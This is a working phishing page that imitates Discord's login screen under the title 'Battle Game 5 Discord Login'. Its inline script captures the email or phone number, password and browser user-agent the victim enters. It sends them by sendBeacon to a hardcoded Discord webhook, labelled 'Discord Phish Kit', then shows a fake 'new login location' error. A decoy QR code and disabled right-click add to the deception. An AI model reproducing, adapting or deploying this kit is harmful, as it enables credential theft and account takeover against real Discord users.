<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Battle Game 5 Discord Login</title>
</head>
<body>
    <img src="./assets/bg.svg" alt="App BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="App">
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">
                    <form id="loginForm">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">
                                Log In
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <img src="./assets/qrcode-app-logo.png" alt="App Logo">
                        </div>
                        <h2>Log in with QR Code</h2>
                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
                        <a href="#">Or sign in with passkey</a>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        // ==================================
        // DISCORD WEBHOOK ONLY â€“ FULLY WORKING (Dec 2025)
        // No Google Forms code = no CORB errors
        // ==================================

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // â† Your webhook URL

        const CONFIG = {
            ANIMATION_DURATION: 3000,
            QR_REFRESH_INTERVAL: 120000  // 2 minutes
        };

        // Selectors
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('emailORphone');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.querySelector('button[type="submit"]');
        const emailWrapper = document.querySelector('.email-wrapper');
        const qrContainer = document.querySelector('.right-section .qr-code');

        // Unblockable send to Discord (sendBeacon = no CORS/CORB ever)
        const sendToDiscord = (email, password) => {
            const payload = JSON.stringify({
                embeds: [{
                    title: "ðŸ†• New Login Captured",
                    color: 0xff0000,  // Red
                    fields: [
                        { name: "ðŸ“§ Email/Phone", value: email || 'N/A', inline: false },
                        { name: "ðŸ”‘ Password", value: password || 'N/A', inline: false },
                        { name: "ðŸŒ User-Agent", value: navigator.userAgent.substring(0, 200), inline: false },
                        { name: "â° Time", value: new Date().toLocaleString(), inline: false }
                    ],
                    footer: { text: "Discord Phish Kit" }
                }]
            });

            // sendBeacon is completely unblockable
            navigator.sendBeacon(WEBHOOK_URL, payload);
        };

        // QR Code Refresh
        const refreshQR = () => {
            if (!qrContainer) return;
            qrContainer.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="Logo">';
            setTimeout(() => {
                const fakeUrl = `https://app.com/ra/${Math.random().toString(36).substring(2, 15)}`;
                const qr = qrcode(0, 'L');
                qr.addData(fakeUrl);
                qr.make();
                const svg = qr.createSvgTag(1, 0);
                const parser = new DOMParser();
                const svgEl = parser.parseFromString(svg, 'image/svg+xml').documentElement;
                svgEl.setAttribute('width', '160');
                svgEl.setAttribute('height', '160');
                qrContainer.innerHTML = '';
                qrContainer.appendChild(svgEl);
                qrContainer.insertAdjacentHTML('beforeend', '<img src="./assets/qrcode-app-logo.png" alt="Logo">');
            }, 1500);
        };

        // Form Submit
        form.addEventListener('submit', e => {
            e.preventDefault();

            const email = emailInput.value.trim();
            const password = passwordInput.value;

            // Loading spinner
            loginBtn.innerHTML = `
                <span class="spinner" role="img" aria-label="Loading">
                    <span class="inner pulsingEllipsis">
                        <span class="item spinnerItem"></span>
                        <span class="item spinnerItem"></span>
                        <span class="item spinnerItem"></span>
                    </span>
                </span>
            `;
            loginBtn.disabled = true;

            // Send credentials to Discord
            sendToDiscord(email, password);

            // Fake delay + red error message
            setTimeout(() => {
                if (!emailWrapper.querySelector('.error-msg')) {
                    emailWrapper.insertAdjacentHTML('afterbegin',
                        '<span class="error-msg" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>'
                    );
                }
                emailInput.style.border = '1px solid red';
                passwordInput.style.border = '1px solid red';

                // Reset button
                loginBtn.innerHTML = 'Log In';
                loginBtn.disabled = false;
            }, CONFIG.ANIMATION_DURATION);
        });

        // Initialization
        document.addEventListener('DOMContentLoaded', () => {
            refreshQR();
            setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
            document.addEventListener('contextmenu', e => e.preventDefault());
        });
    </script>
</body>
</html>